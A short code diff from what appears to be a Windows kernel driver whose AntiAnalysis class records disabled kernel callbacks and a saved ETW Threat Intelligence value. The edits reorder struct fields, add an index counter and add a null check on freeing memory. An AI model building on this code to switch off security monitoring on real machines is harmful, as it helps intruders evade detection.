@@ -80,14 +80,14 @@ struct CmCallback {
 };
 
 struct ObCallbacksList {
-	CallbackType Type;
 	ULONG NumberOfCallbacks;
+	CallbackType Type;
 	ObCallback* Callbacks;
 };
 
 struct PsRoutinesList {
-	CallbackType Type;
 	ULONG NumberOfRoutines;
+	CallbackType Type;
 	PsRoutine* Routines;
 };
 
@@ -108,6 +108,7 @@ class AntiAnalysis {
 private:
 	DisabledKernelCallback DisabledCallbacks[MAX_KERNEL_CALLBACKS];
 	ULONG DisabledCallbacksCount;
+	ULONG DisabledCallbacksLastIndex;
 	ULONG PrevEtwTiValue;
 	FastMutex Lock;
 
@@ -121,7 +122,8 @@ public:
 	}
 
 	void operator delete(void* p) {
-		ExFreePoolWithTag(p, DRIVER_TAG);
+		if (p)
+			ExFreePoolWithTag(p, DRIVER_TAG);
 	}
 
 	AntiAnalysis();
